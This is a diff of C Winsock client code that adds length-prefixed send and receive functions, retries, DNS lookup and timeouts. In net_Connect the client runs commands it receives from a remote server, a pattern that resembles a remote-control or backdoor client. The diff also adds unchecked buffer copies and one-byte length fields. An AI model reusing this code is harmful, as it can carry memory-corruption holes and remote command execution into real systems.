@@ -9,11 +9,16 @@ SOCKET client;
 SOCKADDR_IN serverInfo;
 uint64 ioNonBlockMode = 1;
 uint64 ioBlockMode = 0;
+DWORD timeout = 1000;
 
-int net_SendData(char* msg, int len)
+int net_SendData(uint8* msg, int len)
 {
-    int rv = send(client, msg, len, 0);
-    NET_PROTECT_CPU();
+    uint8 _msg[NET_BUFFSIZE];
+    memset(_msg, 0, NET_BUFFSIZE);
+    memmove(_msg + 1, msg, len);
+    _msg[0] = len;
+    
+    int rv = send(client, _msg, NET_BUFFSIZE, 0);
 
     if(rv < 1)
     {
@@ -23,19 +28,52 @@ int net_SendData(char* msg, int len)
     return rv;
 }
 
-int net_ReciveData(OUT_STRP msg)
+int net_ReciveData(OUT_USTRP msg)
 {
-    char *rbuff = malloc(NET_BUFFSIZE);
-    memset(rbuff, 0, NET_BUFFSIZE);
+    uint8 *rbuff = malloc(NET_BUFFSIZE);
     int rv = recv(client, rbuff, NET_BUFFSIZE, 0);
-    NET_PROTECT_CPU();
 
     if(rv < 1)
     {
-        return -1;
+        free(rbuff);
+
+        return 0;
     }
 
-    *msg = rbuff;
+    int len = rbuff[0];
+    uint8* buff = malloc(len + sizeof(uint8));
+    memset(buff, 0, len + 1);
+    memmove(buff, rbuff + 1, len);
+    free(rbuff);
+    *msg = buff;
+
+    return rv;
+}
+
+int net_ReciveDataTimeout(OUT_USTRP msg)
+{
+    int rv = 0;
+    int tries = 0;
+    uint8* rbuff = malloc(NET_BUFFSIZE);
+    
+    while((rv = recv(client, rbuff, NET_BUFFSIZE, 0)) < 1)
+    {
+        if(tries == NET_RECV_TRIES)
+        {
+            free(rbuff);
+
+            return 0;
+        }
+
+        tries++;
+    }
+
+    int len = rbuff[0];
+    uint8* buff = malloc(len + sizeof(uint8));
+    memset(buff, 0, len + 1);
+    memmove(buff, rbuff + 1, len);
+    free(rbuff);
+    *msg = buff;
 
     return rv;
 }
@@ -55,7 +93,7 @@ void net_Prepare(void)
         exit(0);
     }
 
-    serverInfo.sin_addr.s_addr = inet_addr(NET_IP);
+    serverInfo.sin_addr.s_addr = dns_GetIp(NET_IP);
     serverInfo.sin_family = AF_INET;
     serverInfo.sin_port = htons(NET_PORT);
 }
@@ -115,10 +153,8 @@ void net_Connect(void)
             {
                 continue;
             }else{
-                if(ioctlsocket(client, FIONBIO, &ioBlockMode) != 0)
-                {
-                    return;
-                }
+                ioctlsocket(client, FIONBIO, &ioBlockMode);
+                setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
 
                 if(net_ExecuteCmd(rmsg, strlen(rmsg)) < 1)
                 {
@@ -128,10 +164,7 @@ void net_Connect(void)
                     return;
                 }
 
-                if(ioctlsocket(client, FIONBIO, &ioNonBlockMode))
-                {
-                    return;
-                }
+                ioctlsocket(client, FIONBIO, &ioNonBlockMode);
             }
 
             free(rmsg);
